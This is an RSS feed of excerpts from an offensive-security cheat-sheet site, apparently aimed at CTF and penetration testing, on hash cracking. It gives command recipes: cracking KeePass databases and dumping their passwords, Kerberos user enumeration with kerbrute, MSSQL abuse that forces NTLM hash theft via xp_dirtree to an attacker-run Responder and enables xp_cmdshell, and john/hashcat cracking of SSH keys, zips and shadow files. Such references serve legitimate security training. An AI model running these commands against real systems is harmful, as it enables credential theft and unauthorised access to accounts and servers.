channel.title: Hash Cracking on TLDRBins
channel.description: Recent content in Hash Cracking on TLDRBins

item.title: Keepass
item.description: Master password cracking keepass2john <KDBX_FILE> > hash # With a key file keepass2john -k <KEY_FILE> <KDBX_FILE> > hash kpcli # Open kdbx kpcli --kdb <KDBX_FILE> # Open kdbx with a key file kpcli --key <KEY_FILE> --kdb <KDBX_FILE> # List all passwords find . # Show password (e.g. #0) show -f 0 # Export attachment (e.g. #0) attach 0 Ref: Download kpcli

item.title: Kerberos
item.description: Users Enum kerbrute metasploit kerbrute userenum --domain <DOMAIN> --dc <DC> <USERS_FILE> $ kerbrute userenum --domain absolute.htb --dc dc.absolute.htb usernames.txt __ __ __ / /_____ _____/ /_ _______ __/ /____ / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \ / ,< / __/ / / /_/ / / / /_/ / /_/ __/ /_/|_|\___/_/ /_.___/_/ \__,_/\__/\___/ Version: v1.0.3 (9dad6e1) - 09/24/24 - Ronnie Flathers @ropnop 2024/09/24 14:54:41 > Using KDC(s): 2024/09/24 14:54:41 > dc.

item.title: MSSQL Privilege Escalation
item.description: Enum # Import Module . .\PowerUpSQL.ps1 # Audit Invoke-SQLAudit -Instance <TARGET> -Username '<USER>' -Password '<PASSWORD>' -Verbose # Execute Query Get-SQLQuery -Instance <TARGET> -Username '<USER>' -Password '<PASSWORD>' -Query "<QUERY>" -Verbose Ref: PowerUpSQL.ps1 Abuse #1: Steal NTLM hash # In our local Linux machine sudo responder -I tun0 Method 1 Method 2 Method 3 xp_dirtree '\\<LOCAL_IP>\any\thing'; use master; exec xp_dirtree '\\<LOCAL_IP>\any\thing'; load_file('\\<LOCAL_IP>\any\thing'); Abuse #2: Run xp_cmdshell # Check any policy blocking xp_cmdshell select name from sys.

item.title: Password Cracking
item.description: Convert file to hash format # For example ssh2john id_rsa_encrypted > hash keepass2john test.kdbx > hash zip2john test.zip > hash # Get a full list of *2john find / -name *2john 2>/dev/null john hashcat # General use john --wordlist=/usr/share/wordlists/rockyou.txt hash # Specify hash format john --wordlist=/usr/share/wordlists/rockyou.txt hash --format=Raw-SHA512 # Show cracked hash john --show hash # Show cracked hash with specific format john --show hash --format=Raw-SHA512 # Auto detect hash format hashcat hash # Specify hash format hashcat -m <MODE> -a 0 hash /usr/share/wordlists/rockyou.

item.title: Shadow Hash Cracking
item.description: Shadow Hash Cracking # Prepare an unshadowed hashes file unshadow passwd.txt shadow.txt > unshadowed.txt john hashcat john --wordlist=/usr/share/wordlists/rockyou.txt unshadowed.txt hashcat -m 7400 unshadowed.txt /usr/share/wordlists/rockyou.txt --force --user
